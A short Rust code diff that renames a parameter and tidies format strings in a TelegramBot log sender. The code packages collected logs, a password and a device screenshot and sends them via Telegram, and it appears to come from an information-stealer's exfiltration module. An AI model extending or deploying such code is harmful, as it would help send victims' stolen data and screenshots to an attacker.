@@ -178,20 +178,20 @@ impl TelegramBot {
 
 fn combine_caption_and_thumbnail(caption: &str, thumbnail: Option<String>) -> String {
     match thumbnail {
-        Some(tn) if !tn.is_empty() => format!("{}\n{}", caption, tn),
+        Some(tn) if !tn.is_empty() => format!("{caption}\n{tn}"),
         _ => caption.to_string(),
     }
 }
 
 impl LogSender for TelegramBot {
-    fn send<P, C>(&self, zip_archive: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
+    fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
     where
         P: AsRef<str>,
         C: Collector
     {
-        let (caption, thumbnail) = generate_caption(&zip_archive, password, collector);
+        let (caption, thumbnail) = generate_caption(&log_file, password, collector);
 
-        match zip_archive {
+        match log_file {
             LogFile::ZipArchive(archive) => self.send_as_file(
                 archive,
                 collector.get_device().get_screenshot(),
